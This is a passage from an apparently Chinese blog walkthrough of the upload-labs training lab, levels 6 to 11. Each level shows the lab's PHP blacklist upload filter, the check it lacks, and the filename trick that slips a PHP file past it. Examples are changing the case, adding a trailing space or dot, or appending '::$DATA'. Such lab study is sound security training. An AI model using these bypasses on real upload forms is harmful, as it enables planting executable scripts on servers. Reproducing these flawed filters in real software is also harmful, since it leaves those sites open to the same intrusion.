+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strrchr(<span style="color:#268bd2">$file_name</span>, <span style="color:#2aa198">&#39;.&#39;</span>);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#2aa198">&#39;::$DATA&#39;</span>, <span style="color:#2aa198">&#39;&#39;</span>, <span style="color:#268bd2">$file_ext</span>);<span style="color:#586e75">//去除字符串::$DATA
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//首尾去空
+</span><span style="color:#586e75"></span>
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>, <span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span>date(<span style="color:#2aa198">&#34;YmdHis&#34;</span>)<span style="color:#719e07">.</span>rand(<span style="color:#2aa198">1000</span>,<span style="color:#2aa198">9999</span>)<span style="color:#719e07">.</span><span style="color:#268bd2">$file_ext</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;此文件类型不允许上传！&#39;</span>;
+        }
+</code></pre></div><p>这关少了这一段</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strtolower(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//转换为小写
+</span></code></pre></div><p>也就是后缀不限制大小写了,所以随便一个<strong>phP</strong>就bypass过去了</p>
+<p><img src="images/upload-labs-challenge/6-1.png" alt="6-1"></p>
+<h3 id="pass-07">pass-07</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;.php&#34;</span>,<span style="color:#2aa198">&#34;.php5&#34;</span>,<span style="color:#2aa198">&#34;.php4&#34;</span>,<span style="color:#2aa198">&#34;.php3&#34;</span>,<span style="color:#2aa198">&#34;.php2&#34;</span>,<span style="color:#2aa198">&#34;.html&#34;</span>,<span style="color:#2aa198">&#34;.htm&#34;</span>,<span style="color:#2aa198">&#34;.phtml&#34;</span>,<span style="color:#2aa198">&#34;.pht&#34;</span>,<span style="color:#2aa198">&#34;.pHp&#34;</span>,<span style="color:#2aa198">&#34;.pHp5&#34;</span>,<span style="color:#2aa198">&#34;.pHp4&#34;</span>,<span style="color:#2aa198">&#34;.pHp3&#34;</span>,<span style="color:#2aa198">&#34;.pHp2&#34;</span>,<span style="color:#2aa198">&#34;.Html&#34;</span>,<span style="color:#2aa198">&#34;.Htm&#34;</span>,<span style="color:#2aa198">&#34;.pHtml&#34;</span>,<span style="color:#2aa198">&#34;.jsp&#34;</span>,<span style="color:#2aa198">&#34;.jspa&#34;</span>,<span style="color:#2aa198">&#34;.jspx&#34;</span>,<span style="color:#2aa198">&#34;.jsw&#34;</span>,<span style="color:#2aa198">&#34;.jsv&#34;</span>,<span style="color:#2aa198">&#34;.jspf&#34;</span>,<span style="color:#2aa198">&#34;.jtml&#34;</span>,<span style="color:#2aa198">&#34;.jSp&#34;</span>,<span style="color:#2aa198">&#34;.jSpx&#34;</span>,<span style="color:#2aa198">&#34;.jSpa&#34;</span>,<span style="color:#2aa198">&#34;.jSw&#34;</span>,<span style="color:#2aa198">&#34;.jSv&#34;</span>,<span style="color:#2aa198">&#34;.jSpf&#34;</span>,<span style="color:#2aa198">&#34;.jHtml&#34;</span>,<span style="color:#2aa198">&#34;.asp&#34;</span>,<span style="color:#2aa198">&#34;.aspx&#34;</span>,<span style="color:#2aa198">&#34;.asa&#34;</span>,<span style="color:#2aa198">&#34;.asax&#34;</span>,<span style="color:#2aa198">&#34;.ascx&#34;</span>,<span style="color:#2aa198">&#34;.ashx&#34;</span>,<span style="color:#2aa198">&#34;.asmx&#34;</span>,<span style="color:#2aa198">&#34;.cer&#34;</span>,<span style="color:#2aa198">&#34;.aSp&#34;</span>,<span style="color:#2aa198">&#34;.aSpx&#34;</span>,<span style="color:#2aa198">&#34;.aSa&#34;</span>,<span style="color:#2aa198">&#34;.aSax&#34;</span>,<span style="color:#2aa198">&#34;.aScx&#34;</span>,<span style="color:#2aa198">&#34;.aShx&#34;</span>,<span style="color:#2aa198">&#34;.aSmx&#34;</span>,<span style="color:#2aa198">&#34;.cEr&#34;</span>,<span style="color:#2aa198">&#34;.sWf&#34;</span>,<span style="color:#2aa198">&#34;.swf&#34;</span>,<span style="color:#2aa198">&#34;.htaccess&#34;</span>,<span style="color:#2aa198">&#34;.ini&#34;</span>);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>];
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> deldot(<span style="color:#268bd2">$file_name</span>);<span style="color:#586e75">//删除文件名末尾的点
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strrchr(<span style="color:#268bd2">$file_name</span>, <span style="color:#2aa198">&#39;.&#39;</span>);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strtolower(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//转换为小写
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#2aa198">&#39;::$DATA&#39;</span>, <span style="color:#2aa198">&#39;&#39;</span>, <span style="color:#268bd2">$file_ext</span>);<span style="color:#586e75">//去除字符串::$DATA
+</span><span style="color:#586e75"></span>        
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>, <span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span>date(<span style="color:#2aa198">&#34;YmdHis&#34;</span>)<span style="color:#719e07">.</span>rand(<span style="color:#2aa198">1000</span>,<span style="color:#2aa198">9999</span>)<span style="color:#719e07">.</span><span style="color:#268bd2">$file_ext</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>,<span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;此文件不允许上传&#39;</span>;
+        }
+</code></pre></div><p>少了这段</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//首尾去空
+</span></code></pre></div><p>所以直接就burp抓包 &ldquo;1.php&rdquo;=&gt;&ldquo;1.php &quot; (空格)</p>
+<p><img src="images/upload-labs-challenge/7-2.png" alt="7-2"></p>
+<p><img src="images/upload-labs-challenge/7-1.png" alt="7-1"></p>
+<h3 id="pass-08">pass-08</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;.php&#34;</span>,<span style="color:#2aa198">&#34;.php5&#34;</span>,<span style="color:#2aa198">&#34;.php4&#34;</span>,<span style="color:#2aa198">&#34;.php3&#34;</span>,<span style="color:#2aa198">&#34;.php2&#34;</span>,<span style="color:#2aa198">&#34;.html&#34;</span>,<span style="color:#2aa198">&#34;.htm&#34;</span>,<span style="color:#2aa198">&#34;.phtml&#34;</span>,<span style="color:#2aa198">&#34;.pht&#34;</span>,<span style="color:#2aa198">&#34;.pHp&#34;</span>,<span style="color:#2aa198">&#34;.pHp5&#34;</span>,<span style="color:#2aa198">&#34;.pHp4&#34;</span>,<span style="color:#2aa198">&#34;.pHp3&#34;</span>,<span style="color:#2aa198">&#34;.pHp2&#34;</span>,<span style="color:#2aa198">&#34;.Html&#34;</span>,<span style="color:#2aa198">&#34;.Htm&#34;</span>,<span style="color:#2aa198">&#34;.pHtml&#34;</span>,<span style="color:#2aa198">&#34;.jsp&#34;</span>,<span style="color:#2aa198">&#34;.jspa&#34;</span>,<span style="color:#2aa198">&#34;.jspx&#34;</span>,<span style="color:#2aa198">&#34;.jsw&#34;</span>,<span style="color:#2aa198">&#34;.jsv&#34;</span>,<span style="color:#2aa198">&#34;.jspf&#34;</span>,<span style="color:#2aa198">&#34;.jtml&#34;</span>,<span style="color:#2aa198">&#34;.jSp&#34;</span>,<span style="color:#2aa198">&#34;.jSpx&#34;</span>,<span style="color:#2aa198">&#34;.jSpa&#34;</span>,<span style="color:#2aa198">&#34;.jSw&#34;</span>,<span style="color:#2aa198">&#34;.jSv&#34;</span>,<span style="color:#2aa198">&#34;.jSpf&#34;</span>,<span style="color:#2aa198">&#34;.jHtml&#34;</span>,<span style="color:#2aa198">&#34;.asp&#34;</span>,<span style="color:#2aa198">&#34;.aspx&#34;</span>,<span style="color:#2aa198">&#34;.asa&#34;</span>,<span style="color:#2aa198">&#34;.asax&#34;</span>,<span style="color:#2aa198">&#34;.ascx&#34;</span>,<span style="color:#2aa198">&#34;.ashx&#34;</span>,<span style="color:#2aa198">&#34;.asmx&#34;</span>,<span style="color:#2aa198">&#34;.cer&#34;</span>,<span style="color:#2aa198">&#34;.aSp&#34;</span>,<span style="color:#2aa198">&#34;.aSpx&#34;</span>,<span style="color:#2aa198">&#34;.aSa&#34;</span>,<span style="color:#2aa198">&#34;.aSax&#34;</span>,<span style="color:#2aa198">&#34;.aScx&#34;</span>,<span style="color:#2aa198">&#34;.aShx&#34;</span>,<span style="color:#2aa198">&#34;.aSmx&#34;</span>,<span style="color:#2aa198">&#34;.cEr&#34;</span>,<span style="color:#2aa198">&#34;.sWf&#34;</span>,<span style="color:#2aa198">&#34;.swf&#34;</span>,<span style="color:#2aa198">&#34;.htaccess&#34;</span>,<span style="color:#2aa198">&#34;.ini&#34;</span>);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strrchr(<span style="color:#268bd2">$file_name</span>, <span style="color:#2aa198">&#39;.&#39;</span>);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strtolower(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//转换为小写
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#2aa198">&#39;::$DATA&#39;</span>, <span style="color:#2aa198">&#39;&#39;</span>, <span style="color:#268bd2">$file_ext</span>);<span style="color:#586e75">//去除字符串::$DATA
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//首尾去空
+</span><span style="color:#586e75"></span>        
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>, <span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_name</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;此文件类型不允许上传！&#39;</span>;
+        }
+</code></pre></div><p>按照目前的代码来看,已经可以预知接下来几关都是些啥了</p>
+<p>这里是少了这行,也就是没有限制文件后的点</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> deldot(<span style="color:#268bd2">$file_name</span>);<span style="color:#586e75">//删除文件名末尾的点
+</span></code></pre></div><p>所以就很简单了  只需上传一个1.php.的文件就能绕过黑名单</p>
+<p>这里我看到好多师傅的文章都说这是windows的特性</p>
+<p>但是我在phpstudy和docker的环境中均能回显php内容</p>
+<p><img src="images/upload-labs-challenge/8-1.png" alt="8-1"></p>
+<p><img src="images/upload-labs-challenge/8-2.png" alt="8-2"></p>
+<h3 id="pass-09">pass-09</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;.php&#34;</span>,<span style="color:#2aa198">&#34;.php5&#34;</span>,<span style="color:#2aa198">&#34;.php4&#34;</span>,<span style="color:#2aa198">&#34;.php3&#34;</span>,<span style="color:#2aa198">&#34;.php2&#34;</span>,<span style="color:#2aa198">&#34;.html&#34;</span>,<span style="color:#2aa198">&#34;.htm&#34;</span>,<span style="color:#2aa198">&#34;.phtml&#34;</span>,<span style="color:#2aa198">&#34;.pht&#34;</span>,<span style="color:#2aa198">&#34;.pHp&#34;</span>,<span style="color:#2aa198">&#34;.pHp5&#34;</span>,<span style="color:#2aa198">&#34;.pHp4&#34;</span>,<span style="color:#2aa198">&#34;.pHp3&#34;</span>,<span style="color:#2aa198">&#34;.pHp2&#34;</span>,<span style="color:#2aa198">&#34;.Html&#34;</span>,<span style="color:#2aa198">&#34;.Htm&#34;</span>,<span style="color:#2aa198">&#34;.pHtml&#34;</span>,<span style="color:#2aa198">&#34;.jsp&#34;</span>,<span style="color:#2aa198">&#34;.jspa&#34;</span>,<span style="color:#2aa198">&#34;.jspx&#34;</span>,<span style="color:#2aa198">&#34;.jsw&#34;</span>,<span style="color:#2aa198">&#34;.jsv&#34;</span>,<span style="color:#2aa198">&#34;.jspf&#34;</span>,<span style="color:#2aa198">&#34;.jtml&#34;</span>,<span style="color:#2aa198">&#34;.jSp&#34;</span>,<span style="color:#2aa198">&#34;.jSpx&#34;</span>,<span style="color:#2aa198">&#34;.jSpa&#34;</span>,<span style="color:#2aa198">&#34;.jSw&#34;</span>,<span style="color:#2aa198">&#34;.jSv&#34;</span>,<span style="color:#2aa198">&#34;.jSpf&#34;</span>,<span style="color:#2aa198">&#34;.jHtml&#34;</span>,<span style="color:#2aa198">&#34;.asp&#34;</span>,<span style="color:#2aa198">&#34;.aspx&#34;</span>,<span style="color:#2aa198">&#34;.asa&#34;</span>,<span style="color:#2aa198">&#34;.asax&#34;</span>,<span style="color:#2aa198">&#34;.ascx&#34;</span>,<span style="color:#2aa198">&#34;.ashx&#34;</span>,<span style="color:#2aa198">&#34;.asmx&#34;</span>,<span style="color:#2aa198">&#34;.cer&#34;</span>,<span style="color:#2aa198">&#34;.aSp&#34;</span>,<span style="color:#2aa198">&#34;.aSpx&#34;</span>,<span style="color:#2aa198">&#34;.aSa&#34;</span>,<span style="color:#2aa198">&#34;.aSax&#34;</span>,<span style="color:#2aa198">&#34;.aScx&#34;</span>,<span style="color:#2aa198">&#34;.aShx&#34;</span>,<span style="color:#2aa198">&#34;.aSmx&#34;</span>,<span style="color:#2aa198">&#34;.cEr&#34;</span>,<span style="color:#2aa198">&#34;.sWf&#34;</span>,<span style="color:#2aa198">&#34;.swf&#34;</span>,<span style="color:#2aa198">&#34;.htaccess&#34;</span>,<span style="color:#2aa198">&#34;.ini&#34;</span>);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> deldot(<span style="color:#268bd2">$file_name</span>);<span style="color:#586e75">//删除文件名末尾的点
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strrchr(<span style="color:#268bd2">$file_name</span>, <span style="color:#2aa198">&#39;.&#39;</span>);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strtolower(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//转换为小写
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//首尾去空
+</span><span style="color:#586e75"></span>        
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>, <span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span>date(<span style="color:#2aa198">&#34;YmdHis&#34;</span>)<span style="color:#719e07">.</span>rand(<span style="color:#2aa198">1000</span>,<span style="color:#2aa198">9999</span>)<span style="color:#719e07">.</span><span style="color:#268bd2">$file_ext</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;此文件类型不允许上传！&#39;</span>;
+        }
+</code></pre></div><p>对比代码</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#2aa198">&#39;::$DATA&#39;</span>, <span style="color:#2aa198">&#39;&#39;</span>, <span style="color:#268bd2">$file_ext</span>);<span style="color:#586e75">//去除字符串::$DATA
+</span></code></pre></div><p>所以是直接<strong>1.php::$DATA</strong>就可以bypass</p>
+<p>这里是实打实Windows特性了,只能在Windows的环境下使用这种方法</p>
+<p><img src="images/upload-labs-challenge/9-1.png" alt="9-1"></p>
+<h3 id="pass-10">pass-10</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;.php&#34;</span>,<span style="color:#2aa198">&#34;.php5&#34;</span>,<span style="color:#2aa198">&#34;.php4&#34;</span>,<span style="color:#2aa198">&#34;.php3&#34;</span>,<span style="color:#2aa198">&#34;.php2&#34;</span>,<span style="color:#2aa198">&#34;.html&#34;</span>,<span style="color:#2aa198">&#34;.htm&#34;</span>,<span style="color:#2aa198">&#34;.phtml&#34;</span>,<span style="color:#2aa198">&#34;.pht&#34;</span>,<span style="color:#2aa198">&#34;.pHp&#34;</span>,<span style="color:#2aa198">&#34;.pHp5&#34;</span>,<span style="color:#2aa198">&#34;.pHp4&#34;</span>,<span style="color:#2aa198">&#34;.pHp3&#34;</span>,<span style="color:#2aa198">&#34;.pHp2&#34;</span>,<span style="color:#2aa198">&#34;.Html&#34;</span>,<span style="color:#2aa198">&#34;.Htm&#34;</span>,<span style="color:#2aa198">&#34;.pHtml&#34;</span>,<span style="color:#2aa198">&#34;.jsp&#34;</span>,<span style="color:#2aa198">&#34;.jspa&#34;</span>,<span style="color:#2aa198">&#34;.jspx&#34;</span>,<span style="color:#2aa198">&#34;.jsw&#34;</span>,<span style="color:#2aa198">&#34;.jsv&#34;</span>,<span style="color:#2aa198">&#34;.jspf&#34;</span>,<span style="color:#2aa198">&#34;.jtml&#34;</span>,<span style="color:#2aa198">&#34;.jSp&#34;</span>,<span style="color:#2aa198">&#34;.jSpx&#34;</span>,<span style="color:#2aa198">&#34;.jSpa&#34;</span>,<span style="color:#2aa198">&#34;.jSw&#34;</span>,<span style="color:#2aa198">&#34;.jSv&#34;</span>,<span style="color:#2aa198">&#34;.jSpf&#34;</span>,<span style="color:#2aa198">&#34;.jHtml&#34;</span>,<span style="color:#2aa198">&#34;.asp&#34;</span>,<span style="color:#2aa198">&#34;.aspx&#34;</span>,<span style="color:#2aa198">&#34;.asa&#34;</span>,<span style="color:#2aa198">&#34;.asax&#34;</span>,<span style="color:#2aa198">&#34;.ascx&#34;</span>,<span style="color:#2aa198">&#34;.ashx&#34;</span>,<span style="color:#2aa198">&#34;.asmx&#34;</span>,<span style="color:#2aa198">&#34;.cer&#34;</span>,<span style="color:#2aa198">&#34;.aSp&#34;</span>,<span style="color:#2aa198">&#34;.aSpx&#34;</span>,<span style="color:#2aa198">&#34;.aSa&#34;</span>,<span style="color:#2aa198">&#34;.aSax&#34;</span>,<span style="color:#2aa198">&#34;.aScx&#34;</span>,<span style="color:#2aa198">&#34;.aShx&#34;</span>,<span style="color:#2aa198">&#34;.aSmx&#34;</span>,<span style="color:#2aa198">&#34;.cEr&#34;</span>,<span style="color:#2aa198">&#34;.sWf&#34;</span>,<span style="color:#2aa198">&#34;.swf&#34;</span>,<span style="color:#2aa198">&#34;.htaccess&#34;</span>,<span style="color:#2aa198">&#34;.ini&#34;</span>);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> deldot(<span style="color:#268bd2">$file_name</span>);<span style="color:#586e75">//删除文件名末尾的点
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strrchr(<span style="color:#268bd2">$file_name</span>, <span style="color:#2aa198">&#39;.&#39;</span>);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strtolower(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//转换为小写
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#2aa198">&#39;::$DATA&#39;</span>, <span style="color:#2aa198">&#39;&#39;</span>, <span style="color:#268bd2">$file_ext</span>);<span style="color:#586e75">//去除字符串::$DATA
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//首尾去空
+</span><span style="color:#586e75"></span>        
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>, <span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_name</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+</code></pre></div><p>这里不关就是前几关的结合体,唯一不同的地方就是,这一关不重新命名文件</p>
+<p>而是直接拼接</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_name</span>;
+</code></pre></div><p>并且这这一长串代码只执行一次,所以思为:</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">上传<span style="color:#2aa198">&#34;1.php. .&#34;</span>
+deldot删除末尾的点,变成<span style="color:#2aa198">&#34;1.php &#34;</span>
+trim在去掉首尾的空格成<span style="color:#2aa198">&#34;1.php.&#34;</span>
+再往下的if检测<span style="color:#2aa198">&#34;1.php.&#34;</span>不在黑名单内
+上传成功
+</code></pre></div><p><img src="images/upload-labs-challenge/10-1.png" alt=""></p>
+<h3 id="pass-11">pass-11</h3>
+<p>这一关终于能让我上传php文件了</p>
+<p>但是似乎没有这么简单,php文件上传后,后缀被删除了</p>
+<p><img src="images/upload-labs-challenge/11-1.png" alt="11-1"></p>
+<p>查看代码</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
